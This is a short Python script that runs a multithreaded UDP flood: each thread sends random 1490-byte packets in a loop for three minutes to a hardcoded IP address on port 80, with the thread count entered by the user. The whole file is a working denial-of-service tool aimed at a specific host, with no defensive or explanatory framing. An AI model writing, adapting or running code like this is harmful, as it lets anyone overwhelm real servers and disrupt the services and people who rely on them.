import threading
import sys
import os
import time
import socket
import random
import time

def attack():
	a=3 #number of minutes
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	start = time.time()
	#ip = input("IP Target : ")
	#port = input("Port       : ")
	ip="107.180.95.144"
	port=80	
	os.system("clear")
	sent = 0
	#change number to how many packets each thread should send.
	x=True 
	while x:
    	 sock.sendto(bytes, (ip,port))
    	 sent = sent + 1
    	 print("Thread "+threading.current_thread().name+"Sent %s packet to %s through port:%s"%(sent,ip,port))
    	 end = time.time()
    	 if(end - start)>a*60:
    	 	x=False

nooft=int(input("Enter number of threads"))
#mins=int(input("Enter how long the attack should be"))
mythreads=[]
for i in range(0,nooft):
	t= threading.Thread(target=attack, name="t"+str(i))
	mythreads.append(t)
	t.start() 
for i in range(0,nooft):
	mythreads[i].join()

print("DONE")